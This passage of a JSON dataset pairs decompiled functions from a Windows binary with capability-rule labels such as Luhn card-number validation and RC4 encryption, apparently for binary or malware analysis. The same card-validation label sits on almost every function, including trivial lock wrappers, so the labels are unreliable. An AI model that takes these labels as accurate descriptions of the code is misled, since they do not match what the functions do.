0x4000) != 0) {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x415e51;\n    iStack548 = 0x415e49;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 489
    },
    "00415f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415f8c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.00416180(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.00416100();\n    return;\n}\n",
        "token_count": 125
    },
    "00415fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00415fe0(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x492aae + (in_ECX >> 0x18));\n}\n",
        "token_count": 108
    },
    "00416054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00416054(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x41605f;\n    *NULL = fcn.00404a1c();\n    uStack16 = 0x49a994;\n    uStack20 = 0x41606f;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x49a990 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x492a6c;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x4160be;\n    uStack24 = 0x49a994;\n    uStack28 = 0x4160b6;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 284
    },
    "0041623c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041623c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x416312;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x49a994;\n    puStack308 = 0x41626f;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack312 = 0x4162f5;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.00406774();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x49a990 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x492a6c)) {\n                fcn.00404530();\n                fcn.00405794();\n                cVar2 = fcn.00409a8c();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x4162fc;\n    uStack312 = 0x49a994;\n    uStack316 = 0x4162f4;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 485
    },
    "0041678c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041678c(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 331
    },
    "004167e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004167e0(void)\n\n{\n    fcn.004057e8();\n    fcn.0041678c();\n    return;\n}\n",
        "token_count": 34
    },
    "00416828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416828(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00416814();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 116
    },
    "004168f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004168f0(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4169b7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.004057d4();\n        fcn.004168c0();\n    }\n    else if (cVar1 == '\\v') {\n        var_8h = param_2[2];\n        if ((var_8h & 0xff000000) == 0xff000000) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00405d64();\n        }\n        else {\n            if ((var_8h & 0xff000000) == 0xfe000000) {\n                var_8h = *(*in_EAX + var_8h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n            else {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4169be;\n    uStack36 = 0x4169b6;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 406
    },
    "00416bd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416bd4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00416bc0();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 118
    },
    "00416c14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416c14(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 196
    },
    "00416c4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416c4c(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00416c88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416c88(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.00407024();\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00418450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00418450(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == *param_2) && (in_EAX[1] == param_2[1])) {\n        return CONCAT31(in_EAX[1] >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 87
    },
    "00418464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418464(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00407718(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 40
    },
    "00418584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418584(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.004198b4();\n            cVar1 = fcn.0040487c();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.0040487c(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 206
    },
    "00418998": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00418998(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar2 = fcn.00418654();\n    fcn.0041975c();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 212
    },
    "00418af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00418af4(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x418b77;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404530();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040db40(arg_8h_00, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x418b7e;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 280
    },
    "00418c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418c50(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00418d08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418d08(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00418f54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418f54(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x418fb4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00407550();\n    fcn.0040db40(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x418fbb;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 227
    },
    "00419244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419244(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00419324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419324(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.00409a8c();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 183
    },
    "00419364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00419364(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                fcn.00405584();\n                return 1;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 146
    },
    "004195cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004195cc(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x419662;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x418150) && (in_EAX != *(arg_8h + -8))) {\n        fcn.004045dc();\n        fcn.004195cc(arg_8h);\n        fcn.00404530();\n        fcn.00405794();\n        fcn.004069c0(0);\n        fcn.00406a10();\n        fcn.00419464();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x419669;\n    uStack280 = 0x419661;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 252
    },
    "004197a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004197a8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.00419840();\n    }\n    iVar1 = *(in_EAX[1] + param_2 * 4);\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00419808": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419808(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.00419804();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040db40(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405470();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x496014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 194
    },
    "00419930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419930(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] < param_2)) {\n        fcn.00419840();\n    }\n    if (in_EAX[2] == in_EAX[3]) {\n        (***in_EAX)();\n    }\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    *(in_EAX[1] + param_2 * 4) = param_1;\n    in_EAX[2] = in_EAX[2] + 1;\n    if (param_1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00419a18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419a18(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.00419840();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f34();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00419a54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419a54(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.00419840();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.00419a18();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403af4();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.004197a8();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 245
    },
    "00419acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419acc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "00419b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00419b20(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x419b2b;\n    *NULL = fcn.00404a1c();\n    puStack16 = 0x419b39;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00419c24();\n    iStack20 = 0x419b83;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00404650();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419b8a;\n    iStack20 = 0x419b76;\n    fcn.00419c88();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x419b82;\n    sub.kernel32.dll_DeleteCriticalSection();\n    return;\n}\n",
        "token_count": 272
    },
    "00419c88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419c88(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00419e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00419e70(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x419f26;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.004055c8();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404530();\n        fcn.00405794();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.00404530();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040dbfc(1, &var_114h);\n    fcn.00404ec4();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x419f2d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 346
    },
    "0041a1b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a1b8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a25f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x41a1e2;\n    fcn.0041a328();\n    uStack48 = 0x41a242;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41a249;\n    uStack48 = 0x41a241;\n    fcn.0041a3e4();\n    return;\n}\n",
        "token_count": 365
    },
    "0041a270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a270(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41a288;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x41a298;\n        fcn.0041a328();\n        uStack24 = 0x41a310;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        (**(*in_EAX + 0x44))();\n        *(in_EAX + 1) = *(param_2 + 4);\n        *(in_EAX + 0xd) = *(param_2 + 0xd);\n        *(in_EAX + 3) = *(param_2 + 0xc);\n        *(in_EAX + 5) = *(param_2 + 5);\n        fcn.00405584();\n        *(in_EAX + 0xe) = *(param_2 + 0xe);\n        (**(*in_EAX + 0x40))();\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x41a321;\n        uStack24 = 0x41a30f;\n        fcn.0041a3e4();\n        return;\n    }\n    puStack20 = 0x41a321;\n    fcn.00419e5c();\n    return;\n}\n",
        "token_count": 381
    },
    "0041a398": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a398(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.0041aef8;\n    fcn.0041a340(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 93
    },
    "0041a3f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
